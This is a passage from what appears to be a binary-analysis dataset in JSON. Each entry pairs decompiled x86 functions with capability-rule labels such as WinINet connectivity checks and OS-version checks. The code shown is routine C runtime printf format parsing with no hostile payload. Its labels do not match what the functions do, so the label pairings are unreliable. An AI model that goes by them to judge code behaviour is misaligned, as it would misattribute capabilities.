        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040acb0(uint *param_1)\n\n{\n    uint arg_8h;\n    uint8_t uVar1;\n    uint arg_10h;\n    int32_t var_478h;\n    uint var_474h;\n    uint var_46ch;\n    uint32_t var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    arg_8h = **param_1;\n    uVar1 = fcn.004113cc(arg_8h);\n    var_464h = var_464h & 0xffffff00 | uVar1;\n    fcn.00409677(*param_1[1]);\n    var_460h = **param_1;\n    arg_10h = param_1[2][1];\n    fcn.0040ac3d(&var_460h, *param_1[2], arg_10h, *param_1[3], &var_474h, *param_1[4]);\n    fcn.0040b06b();\n    fcn.0040ac72();\n    if (var_46ch != '\\0') {\n        *(var_478h + 0x350) = *(var_478h + 0x350) & 0xfffffffd;\n    }\n    fcn.00411481(var_464h, arg_8h);\n    fcn.0040640a(arg_10h);\n    return;\n}\n",
        "token_count": 361
    },
    "0040b494": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040b494(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint arg_8h;\n    uint arg_ch;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) == 0) {\n                param_1[7] = 8;\ncode_r0x0040b4cc:\n                puVar5 = fcn.0040f5be();\n                *puVar5 = 0x16;\n                fcn.004099f0();\n                return 0;\n            }\n        }\n        else {\n            if (param_1[0xb] != 0) goto code_r0x0040b4cc;\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                }\n                else if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                    }\n                    else if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                    }\n                    else if (((((cVar4 == 'd') || (cVar4 == 'i')) || (cVar4 == 'o')) ||\n                             ((cVar4 == 'u' || (cVar4 == 'x')))) || (cVar4 == 'X')) {\n                        param_1[0xb] = 9;\n                    }\n                }\n                else if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                }\n                else if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                }\n                else if (cVar4 == 'h') {\n                    if (*param_1[4] == 'h') {\n                        param_1[0xb] = 1;\n                        param_1[4] = param_1[4] + 1;\n                    }\n                    else {\n                        param_1[0xb] = 2;\n                    }\n                }\n            }\n            else if (cVar4 == 'l') {\n                if (*param_1[4] == 'l') {\n                    param_1[0xb] = 4;\n                    param_1[4] = param_1[4] + 1;\n                }\n                else {\n                    param_1[0xb] = 3;\n                }\n            }\n            else if (cVar4 == 't') {\n                param_1[0xb] = 7;\n            }\n            else if (cVar4 == 'w') {\n                param_1[0xb] = 0xc;\n            }\n            else if (cVar4 == 'z') {\n                param_1[0xb] = 6;\n            }\n        }\n        return 1;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    iVar6 = 1;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0040b9a6:\n            param_1[8] = param_1[8] | 0x10;\n            goto code_r0x0040b9aa;\n        }\n        if ('X' < cVar4) {\n            if (cVar4 == 'Z') {\n                cVar4 = fcn.0040c091();\n                goto code_r0x0040b942;\n            }\n            if (cVar4 != 'a') {\n                if (cVar4 != 'c') {\n                    return 0;\n                }\ncode_r0x0040b966:\n                cVar4 = fcn.0040c423(0);\n                goto code_r0x0040b942;\n            }\ncode_r0x0040b9b6:\n            cVar4 = fcn.0040c157();\n            goto code_r0x0040b942;\n        }\n        if (cVar4 != 'X') {\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0040b966;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0040b93b;\n                }\n            }\n            goto code_r0x0040b9b6;\n        }\n        arg_ch = 1;\ncode_r0x0040b952:\n        arg_8h = 0x10;\n    }\n    else {\n        if (cVar4 < 'q') {\n            if (cVar4 == 'p') {\n                cVar4 = fcn.0040c728();\n                goto code_r0x0040b942;\n            }\n            if (cVar4 < 'h') goto code_r0x0040b9b6;\n            if (cVar4 != 'i') {\n                if (cVar4 == 'n') {\n                    cVar4 = fcn.0040c695();\n                }\n                else {\n                    if (cVar4 != 'o') {\n                        return 0;\n                    }\n                    cVar4 = fcn.0040c709();\n                }\n                goto code_r0x0040b942;\n            }\n            goto code_r0x0040b9a6;\n        }\n        if (cVar4 == 's') {\ncode_r0x0040b93b:\n            cVar4 = fcn.0040c740();\n            goto code_r0x0040b942;\n        }\n        if (cVar4 != 'u') {\n            if (cVar4 != 'x') {\n                return 0;\n            }\n            arg_ch = 0;\n            goto code_r0x0040b952;\n        }\ncode_r0x0040b9aa:\n        arg_ch = 0;\n        arg_8h = 10;\n    }\n    cVar4 = fcn.0040c54b(arg_8h, arg_ch);\ncode_r0x0040b942:\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    uVar2 = param_1[8];\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    iVar7 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        iVar7 = iVar6;\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                iVar7 = 0;\n                if ((uVar2 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    iVar7 = iVar6;\n                }\n            }\n            else {\n                uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n            }\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n    }\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 != 'x') && (cVar4 != 'X')) || ((uVar2 >> 5 & 1) == 0)) {\n        iVar6 = 0;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar6 != '\\0') || (bVar3)) {\n        *(&uStack8 + iVar7) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            bVar3 = true;\n        }\n        else {\n            bVar3 = false;\n        }\n        *(&uStack8 + iVar7 + 1) = (!bVar3 - 1U & 0xe0) + 0x78;\n        iVar7 = iVar7 + 2;\n    }\n    iVar6 = (param_1[9] - param_1[0xe]) - iVar7;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.0040aaa0(param_1 + 0x112, 0x20, iVar6, param_1 + 6);\n    }\n    fcn.0040cbb5(&uStack8, iVar7, param_1 + 6, param_1[3]);\n    arg_14h = param_1 + 6;\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.0040aaa0(param_1 + 0x112, 0x30, iVar6, arg_14h);\n    }\n    fcn.0040c96b(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.0040aaa0(param_1 + 0x112, 0x20, iVar6, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2320
    },
    "0040b8f5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040b8f5(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_8h;\n    uint arg_ch;\n    int32_t var_4h;\n    \n    iVar4 = 1;\n    cVar3 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar3 < 'e') {\n        if (cVar3 == 'd') {\ncode_r0x0040b9a6:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\n            goto code_r0x0040b9aa;\n        }\n        if ('X' < cVar3) {\n            if (cVar3 == 'Z') {\n                cVar3 = fcn.0040c091();\n                goto code_r0x0040b942;\n            }\n            if (cVar3 != 'a') {\n                if (cVar3 != 'c') {\n                    return 0;\n                }\ncode_r0x0040b966:\n                cVar3 = fcn.0040c423(0);\n                goto code_r0x0040b942;\n            }\ncode_r0x0040b9b6:\n            cVar3 = fcn.0040c157();\n            goto code_r0x0040b942;\n        }\n        if (cVar3 != 'X') {\n            if (cVar3 != 'A') {\n                if (cVar3 == 'C') goto code_r0x0040b966;\n                if (cVar3 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar3) {\n                    if (cVar3 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0040b93b;\n                }\n            }\n            goto code_r0x0040b9b6;\n        }\n        arg_ch = 1;\ncode_r0x0040b952:\n        arg_8h = 0x10;\n    }\n    else {\n        if (cVar3 < 'q') {\n            if (cVar3 == 'p') {\n                cVar3 = fcn.0040c728();\n                goto code_r0x0040b942;\n            }\n            if (cVar3 < 'h') goto code_r0x0040b9b6;\n            if (cVar3 != 'i') {\n                if (cVar3 == 'n') {\n                    cVar3 = fcn.0040c695();\n                }\n                else {\n                    if (cVar3 != 'o') {\n                        return 0;\n                    }\n                    cVar3 = fcn.0040c709();\n                }\n                goto code_r0x0040b942;\n            }\n            goto code_r0x0040b9a6;\n        }\n        if (cVar3 == 's') {\ncode_r0x0040b93b:\n            cVar3 = fcn.0040c740();\n            goto code_r0x0040b942;\n        }\n        if (cVar3 != 'u') {\n            if (cVar3 != 'x') {\n                return 0;\n            }\n            arg_ch = 0;\n            goto code_r0x0040b952;\n        }\ncode_r0x0040b9aa:\n        arg_ch = 0;\n        arg_8h = 10;\n    }\n    cVar3 = fcn.0040c54b(arg_8h, arg_ch);\ncode_r0x0040b942:\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    uVar1 = *(in_ECX + 0x20);\n    var_4h = var_4h._3_1_ << 0x18;\n    iVar5 = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        iVar5 = iVar4;\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                iVar5 = 0;\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    iVar5 = iVar4;\n                }\n            }\n            else {\n                var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n            }\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n    }\n    cVar3 = *(in_ECX + 0x31);\n    if (((cVar3 != 'x') && (cVar3 != 'X')) || ((uVar1 >> 5 & 1) == 0)) {\n        iVar4 = 0;\n    }\n    if ((cVar3 == 'a') || (cVar3 == 'A')) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((iVar4 != '\\0') || (bVar2)) {\n        *(&var_4h + iVar5) = 0x30;\n        if ((cVar3 == 'X') || (cVar3 == 'A')) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        *(&var_4h + iVar5 + 1) = (!bVar2 - 1U & 0xe0) + 0x78;\n        iVar5 = iVar5 + 2;\n    }\n    iVar4 = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - iVar5;\n    if ((uVar1 & 0xc) == 0) {\n        fcn.0040aaa0(in_ECX + 0x448, 0x20, iVar4, in_ECX + 0x18);\n    }\n    fcn.0040cbb5(&var_4h, iVar5, in_ECX + 0x18, *(in_ECX + 0xc));\n    arg_14h = in_ECX + 0x18;\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.0040aaa0(in_ECX + 0x448, 0x30, iVar4, arg_14h);\n    }\n    fcn.0040c96b(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.0040aaa0(in_ECX + 0x448, 0x20, iVar4, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1672
    },
    "0040b5fd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b5fd(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint16_t *puVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    int32_t arg_ch;\n    uint unaff_ESI;\n    int32_t arg_10h;\n    uint16_t uVar9;\n    uint arg_8h;\n    uint arg_ch_00;\n    uint uStack16;\n    ushort uStack12;\n    uint32_t uStack8;\n    \n    puVar6 = *(param_1 + 0x32);\n    if (puVar6 != 0x46) {\n        if (puVar6 == 0x4e) {\n            puVar6 = *param_1 & 8;\n            if (puVar6 == NULL) {\n                param_1[7] = 8;\ncode_r0x0040b638:\n                puVar7 = fcn.0040f5be();\n                *puVar7 = 0x16;\n                uVar8 = fcn.004099f0();\n                return uVar8 & 0xffffff00;\n            }\n        }\n        else {\n            if (param_1[0xb] != 0) goto code_r0x0040b638;\n            if (puVar6 < 0x6b) {\n                if (puVar6 == 0x6a) {\n                    param_1[0xb] = 5;\n                }\n                else if (puVar6 == 0x49) {\n                    puVar2 = param_1[4];\n                    puVar6 = *puVar2;\n                    if ((puVar6 == 0x33) && (puVar2[1] == 0x32)) {\n                        puVar6 = puVar2 + 2;\n                        param_1[0xb] = 10;\n                        param_1[4] = puVar6;\n                    }\n                    else if ((puVar6 == 0x36) && (puVar2[1] == 0x34)) {\n                        puVar6 = puVar2 + 2;\n                        param_1[0xb] = 0xb;\n                        param_1[4] = puVar6;\n                    }\n                    else if (((((puVar6 == 0x64) || (puVar6 == 0x69)) || (puVar6 == 0x6f)) ||\n                             ((puVar6 == 0x75 || (puVar6 == 0x78)))) || (puVar6 == 0x58)) {\n                        param_1[0xb] = 9;\n                    }\n                }\n                else if (puVar6 == 0x4c) {\n                    param_1[0xb] = 8;\n                }\n                else if (puVar6 == 0x54) {\n                    param_1[0xb] = 0xd;\n                }\n                else if (puVar6 == 0x68) {\n                    puVar6 = param_1[4];\n                    if (*puVar6 == 0x68) {\n                        puVar6 = puVar6 + 1;\n                        param_1[0xb] = 1;\n                        param_1[4] = puVar6;\n                    }\n                    else {\n                        param_1[0xb] = 2;\n                    }\n                }\n            }\n            else if (puVar6 == 0x6c) {\n                puVar6 = param_1[4];\n                if (*puVar6 == 0x6c) {\n                    puVar6 = puVar6 + 1;\n                    param_1[0xb] = 4;\n                    param_1[4] = puVar6;\n                }\n                else {\n                    param_1[0xb] = 3;\n                }\n            }\n            else if (puVar6 == 0x74) {\n                param_1[0xb] = 7;\n            }\n            else if (puVar6 == 0x77) {\n                param_1[0xb] = 0xc;\n            }\n            else if (puVar6 == 0x7a) {\n                param_1[0xb] = 6;\n            }\n        }\ncode_r0x0040b776:\n        return CONCAT31(puVar6 >> 8, 1);\n    }\n    puVar6 = *param_1 & 8;\n    if (puVar6 != NULL) goto code_r0x0040b776;\n    param_1[7] = 7;\n    uStack8 = *0x424008 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x0040bbe3:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0040bbe7:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0040bbea:\n            cVar5 = fcn.0040c54b(arg_8h, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0040bb8f:\n                arg_8h = 0x10;\n                goto code_r0x0040bbea;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x0040bba3;\n                if (uVar9 < 0x45) goto code_r0x0040bd71;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x0040bd71;\n                    goto code_r0x0040bb77;\n                }\n            }\ncode_r0x0040bbf3:\n            cVar5 = fcn.0040c2b1();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.0040c0f4();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x0040bbf3;\n            if (uVar9 != 99) goto code_r0x0040bd71;\ncode_r0x0040bba3:\n            cVar5 = fcn.0040c4b3(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.0040c728();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x0040bbf3;\n            if (uVar9 == 0x69) goto code_r0x0040bbe3;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.0040c695();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x0040bd71;\n                cVar5 = fcn.0040c709();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x0040bd71;\n                arg_ch_00 = 0;\n                goto code_r0x0040bb8f;\n            }\n            goto code_r0x0040bbe7;\n        }\ncode_r0x0040bb77:\n        cVar5 = fcn.0040c7b3();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x0040bd71;\n    uVar8 = param_1[8];\n    uStack16 = 0;\n    uStack12 = 0;\n    arg_ch = 0;\n    if ((uVar8 >> 4 & 1) != 0) {\n        if ((uVar8 >> 6 & 1) == 0) {\n            if ((uVar8 & 1) == 0) {\n                if ((uVar8 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                }\n                goto code_r0x0040bc71;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        arg_ch = 1;\n    }\ncode_r0x0040bc71:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar8 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&uStack16 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            bVar3 = true;\n        }\n        else {\n            bVar3 = false;\n        }\n        *(&uStack16 + arg_ch * 2 + 2) = (!bVar3 - 1U & 0xe0) + 0x78;\n        arg_ch = arg_ch + 2;\n    }\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((uVar8 & 0xc) == 0) {\n        fcn.0040aa6f(param_1 + 0x112, 0x20, arg_10h, param_1 + 6);\n    }\n    fcn.0040cb28(&uStack16, arg_ch, param_1 + 6, param_1[3]);\n    arg_14h = param_1 + 6;\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.0040aa6f(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.0040ca12(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.0040aa6f(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\ncode_r0x0040bd71:\n    uVar8 = fcn.0040640a(unaff_ESI);\n    return uVar8;\n}\n",
        "token_count": 2535
    },
    "0040bb24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040bb24(int32_t param_1)\n\n{\n    int32_t *arg_14h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    uint unaff_ESI;\n    int32_t arg_10h;\n    uint16_t uVar6;\n    uint arg_8h;\n    uint arg_ch_00;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    uVar6 = *(param_1 + 0x32);\n    if (uVar6 < 0x65) {\n        if (uVar6 == 100) {\ncode_r0x0040bbe3:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x0040bbe7:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0040bbea:\n            cVar5 = fcn.0040c54b(arg_8h, arg_ch_00);\n        }\n        else if (uVar6 < 0x59) {\n            if (uVar6 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0040bb8f:\n                arg_8h = 0x10;\n                goto code_r0x0040bbea;\n            }\n            if (uVar6 != 0x41) {\n                if (uVar6 == 0x43) goto code_r0x0040bba3;\n                if (uVar6 < 0x45) goto code_r0x0040bd71;\n                if (0x47 < uVar6) {\n                    if (uVar6 != 0x53) goto code_r0x0040bd71;\n                    goto code_r0x0040bb77;\n                }\n            }\ncode_r0x0040bbf3:\n            cVar5 = fcn.0040c2b1();\n        }\n        else if (uVar6 == 0x5a) {\n            cVar5 = fcn.0040c0f4();\n        }\n        else {\n            if (uVar6 == 0x61) goto code_r0x0040bbf3;\n            if (uVar6 != 99) goto code_r0x0040bd71;\ncode_r0x0040bba3:\n            cVar5 = fcn.0040c4b3(0);\n        }\n    }\n    else if (uVar6 < 0x71) {\n        if (uVar6 == 0x70) {\n            cVar5 = fcn.0040c728();\n        }\n        else {\n            if (uVar6 < 0x68) goto code_r0x0040bbf3;\n            if (uVar6 == 0x69) goto code_r0x0040bbe3;\n            if (uVar6 == 0x6e) {\n                cVar5 = fcn.0040c695();\n            }\n            else {\n                if (uVar6 != 0x6f) goto code_r0x0040bd71;\n                cVar5 = fcn.0040c709();\n            }\n        }\n    }\n    else {\n        if (uVar6 != 0x73) {\n            if (uVar6 != 0x75) {\n                if (uVar6 != 0x78) goto code_r0x0040bd71;\n                arg_ch_00 = 0;\n                goto code_r0x0040bb8f;\n            }\n            goto code_r0x0040bbe7;\n        }\ncode_r0x0040bb77:\n        cVar5 = fcn.0040c7b3();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x0040bd71;\n    uVar2 = *(param_1 + 0x20);\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    arg_ch = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                }\n                goto code_r0x0040bc71;\n            }\n            uVar6 = 0x2b;\n        }\n        else {\n            uVar6 = 0x2d;\n        }\n        var_ch = uVar6;\n        arg_ch = 1;\n    }\ncode_r0x0040bc71:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            bVar3 = true;\n        }\n        else {\n            bVar3 = false;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = (!bVar3 - 1U & 0xe0) + 0x78;\n        arg_ch = arg_ch + 2;\n    }\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.0040aa6f(param_1 + 0x448, 0x20, arg_10h, param_1 + 0x18);\n    }\n    fcn.0040cb28(&var_ch, arg_ch, param_1 + 0x18, *(param_1 + 0xc));\n    arg_14h = param_1 + 0x18;\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.0040aa6f(param_1 + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.0040ca12(0);\n    if ((-1 < *arg_14h) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.0040aa6f(param_1 + 0x448, 0x20, arg_10h, arg_14h);\n    }\ncode_r0x0040bd71:\n    fcn.0040640a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1683
    },
    "0040b779": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b779(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint16_t *puVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    int32_t arg_ch;\n    uint unaff_ESI;\n    int32_t arg_10h;\n    uint16_t uVar9;\n    uint arg_8h;\n    uint arg_ch_00;\n    uint uStack16;\n    ushort uStack12;\n    uint32_t uStack8;\n    \n    puVar6 = *(param_1 + 0x32);\n    if (puVar6 != 0x46) {\n        if (puVar6 == 0x4e) {\n            puVar6 = *param_1 & 8;\n            if (puVar6 == NULL) {\n                param_1[7] = 8;\ncode_r0x0040b7b4:\n                puVar7 = fcn.0040f5be();\n                *puVar7 = 0x16;\n                uVar8 = fcn.004099f0();\n                return uVar8 & 0xffffff00;\n            }\n        }\n        else {\n            if (param_1[0xb] != 0) goto code_r0x0040b7b4;\n            if (puVar6 < 0x6b) {\n                if (puVar6 == 0x6a) {\n                    param_1[0xb] = 5;\n                }\n                else if (puVar6 == 0x49) {\n                    puVar2 = param_1[4];\n                    puVar6 = *puVar2;\n                    if ((puVar6 == 0x33) && (puVar2[1] == 0x32)) {\n                        puVar6 = puVar2 + 2;\n                        param_1[0xb] = 10;\n                        param_1[4] = puVar6;\n                    }\n                    else if ((puVar6 == 0x36) && (puVar2[1] == 0x34)) {\n                        puVar6 = puVar2 + 2;\n                        param_1[0xb] = 0xb;\n                        param_1[4] = puVar6;\n                    }\n                    else if (((((puVar6 == 0x64) || (puVar6 == 0x69)) || (puVar6 == 0x6f)) ||\n                             ((puVar6 == 0x75 || (puVar6 == 0x78)))) || (puVar6 == 0x58)) {\n                        param_1[0xb] = 9;\n                    }\n                }\n                else if (puVar6 == 0x4c) {\n                    param_1[0xb] = 8;\n                }\n                else if (puVar6 == 0x54) {\n                    param_1[0xb] = 0xd;\n                }\n                else if (puVar6 == 0x68) {\n                    puVar6 = param_1[4];\n                    if (*puVar6 == 0x68) {\n                        puVar6 = puVar6 + 1;\n                        param_1[0xb] = 1;\n                        param_1[4] = puVar6;\n                    }\n                    else {\n                        param_1[0xb] = 2;\n                    }\n                }\n            }\n            else if (puVar6 == 0x6c) {\n                puVar6 = param_1[4];\n                if (*puVar6 == 0x6c) {\n                    puVar6 = puVar6 + 1;\n                    param_1[0xb] = 4;\n                    param_1[4] = puVar6;\n                }\n                else {\n                    param_1[0xb] = 3;\n                }\n            }\n            else if (puVar6 == 0x74) {\n                param_1[0xb] = 7;\n            }\n            else if (puVar6 == 0x77) {\n                param_1[0xb] = 0xc;\n            }\n            else if (puVar6 == 0x7a) {\n                param_1[0xb] = 6;\n            }\n        }\ncode_r0x0040b8f2:\n        return CONCAT31(puVar6 >> 8, 1);\n    }\n    puVar6 = *param_1 & 8;\n    if (puVar6 != NULL) goto code_r0x0040b8f2;\n    param_1[7] = 7;\n    uStack8 = *0x424008 ^ 